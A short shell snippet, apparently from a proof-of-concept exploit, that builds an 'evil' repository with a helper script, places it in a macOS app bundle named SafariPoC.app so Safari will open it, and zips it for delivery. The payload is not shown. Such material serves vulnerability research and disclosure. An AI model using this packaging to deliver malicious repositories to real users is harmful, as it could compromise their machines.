# we're wrapping the repo into an application to make sure Safari will open it.
./make_evil_repo.sh
cp -r evil ./SafariPoC.app/Contents/Resources/evil
zip -yr ./safari.zip ./SafariPoC.app